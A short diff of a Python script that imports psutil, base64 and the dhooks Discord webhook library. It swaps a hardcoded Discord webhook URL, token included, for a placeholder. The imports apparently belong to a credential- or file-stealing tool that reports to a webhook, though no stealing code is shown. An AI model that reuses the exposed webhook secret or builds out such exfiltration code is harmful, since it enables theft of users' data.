@@ -19,7 +19,7 @@ import psutil
 from dhooks import Webhook, File
 import base64
 
-webhook_url = "https://discord.com/api/webhooks/986680080006783037/bXf43qziuRwrOLBf4PHKh7_Ginlfpk0JrSmpDscqcv7hfG24aM160yJY3gh8vZqOkBNh"
+webhook_url = "your_webhook_url"
 
 try:        
     from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
